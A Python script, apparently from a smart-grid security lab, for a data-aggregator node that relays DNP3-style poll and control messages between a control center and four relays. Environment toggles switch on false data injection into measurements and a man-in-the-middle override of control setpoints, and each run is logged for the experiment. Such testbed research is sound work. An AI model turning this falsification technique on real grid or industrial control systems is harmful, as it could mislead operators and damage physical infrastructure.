#!/usr/bin/env python3

import os
import socket
import time
from socket import error as socket_error

import util

MY_HOST = "10.0.0.20"
RELAY_IPs = ["10.0.0.11", "10.0.0.12", "10.0.0.13", "10.0.0.14"]
PORT = 20000

# PROJECT5_FDIA: 0/false disables measurement FDIA; default on for Project 3 compatibility
_v_fdia = os.environ.get("PROJECT5_FDIA", "1")
FDIA_ON = _v_fdia.lower() not in ("0", "false", "no", "")

TYPE_C_ATTACK = False
MALICIOUS_SETPOINT = 8.0
if os.environ.get("PROJECT5_TYPE_C", "").lower() in ("1", "true", "yes"):
    TYPE_C_ATTACK = True

EXPERIMENT_MODE = os.environ.get("PROJECT5_MODE", "default")

fdia_measure = {
    22: 0.19,
    32: 0.10,
    42: -0.04,
    52: -0.08,
    62: 0.04,
    72: 0.01,
    82: 0.08,
    92: -0.08,
    13: 0.67,
    23: 1.79,
    33: 1.02,
    43: 0.23,
    53: -1.07,
    63: -0.11,
    73: -1.14,
    83: 0.10,
    93: -1.49,
}


def _log_line(line):
    print(line, flush=True)
    _lf = os.environ.get("PROJECT5_LOG_FILE")
    if _lf:
        try:
            with open(_lf, "a", encoding="utf-8") as fp:
                fp.write(line + "\n")
        except OSError:
            pass


def main():
    _log_line(
        "PROJECT5,CONFIG,mode=%s,fdia=%s,type_c=%s,tier1_env=%s,tier2_env=%s"
        % (
            EXPERIMENT_MODE,
            FDIA_ON,
            TYPE_C_ATTACK,
            os.environ.get("PROJECT5_TIER1", "1"),
            os.environ.get("PROJECT5_TIER2", "1"),
        )
    )

    s_to_relays = []
    for i in range(len(RELAY_IPs)):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_to_relays.append(s)

    print("Make connection to four relays.")
    active_relays = []
    for i in range(len(RELAY_IPs)):
        try:
            s_to_relays[i].connect((RELAY_IPs[i], PORT + i + 1))
        except socket_error as serr:
            print(serr)
            s_to_relays[i].close()
            continue
        active_relays.append(i + 1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_to_controlcenter:
        s_to_controlcenter.bind((MY_HOST, PORT))
        s_to_controlcenter.listen()
        print("Waiting for control center to connect.")
        print(
            "FDIA_ON=%s TYPE_C_ATTACK=%s"
            % (FDIA_ON, TYPE_C_ATTACK)
        )

        conn, addr = s_to_controlcenter.accept()

        with conn:
            print("Connected by", addr)
            while True:
                data = conn.recv(1024)
                print("Waiting for data to receive.")
                if not data:
                    print(
                        "An packet without payload is received, end the connection."
                    )
                    break
                print("Receiving data from a control center.")
                op = util.message_opcode(data)
                if op == util.REQ_POLL:
                    list_of_indices = util.unpack_dnp3m_request(data)

                    relay_indices = {}
                    for i in active_relays:
                        relay_indices[i] = []
                    for i in list_of_indices:
                        relay_num = util.index_to_relay(i)
                        if relay_num in relay_indices:
                            relay_indices[relay_num].append(i)

                    relay_measure = {}
                    for key in relay_indices.keys():
                        cur_relay_socket = s_to_relays[key - 1]
                        cur_req = util.pack_dnp3m_request(relay_indices[key])
                        cur_relay_socket.sendall(cur_req)
                        rdata = cur_relay_socket.recv(1024)
                        relay_measure.update(util.unpack_dnp3m_response(rdata))
                    util.print_measure(relay_measure)
                    if FDIA_ON:
                        relay_measure = util.change_measure(
                            relay_measure, fdia_measure
                        )

                    aggregate_res = util.pack_dnp3m_response(
                        list_of_indices, relay_measure
                    )
                    conn.sendall(aggregate_res)

                elif op == util.REQ_CONTROL:
                    target_index, setpoint = util.unpack_dnp3m_control(data)
                    orig_sp = float(setpoint)
                    t0 = time.time()
                    if TYPE_C_ATTACK:
                        print(
                            "Type-C MitM: overriding command setpoint %.4f -> %.4f"
                            % (setpoint, MALICIOUS_SETPOINT)
                        )
                        setpoint = MALICIOUS_SETPOINT
                    relay_num = util.index_to_relay(target_index)
                    if relay_num not in active_relays:
                        print("Target relay not connected; rejecting.")
                        conn.sendall(util.pack_control_ack(util.STATUS_REJECT))
                        continue
                    cur_sock = s_to_relays[relay_num - 1]
                    fwd = util.pack_dnp3m_control(target_index, setpoint)
                    cur_sock.sendall(fwd)
                    ack = cur_sock.recv(1024)
                    dt_ms = (time.time() - t0) * 1000.0
                    status = util.unpack_control_ack(ack)
                    conn.sendall(ack)
                    line = (
                        "PROJECT5,DA_CONTROL,mode=%s,idx=%d,orig_sp=%.6f,fwd_sp=%.6f,type_c=%s,ack_status=%d,latency_ms=%.3f"
                        % (
                            EXPERIMENT_MODE,
                            target_index,
                            orig_sp,
                            float(setpoint),
                            TYPE_C_ATTACK,
                            status,
                            dt_ms,
                        )
                    )
                    print(line, flush=True)
                    _lf = os.environ.get("PROJECT5_LOG_FILE")
                    if _lf:
                        try:
                            with open(_lf, "a", encoding="utf-8") as fp:
                                fp.write(line + "\n")
                        except OSError:
                            pass
                else:
                    print("Unknown opcode from control center:", op)
                    break


if __name__ == "__main__":
    main()
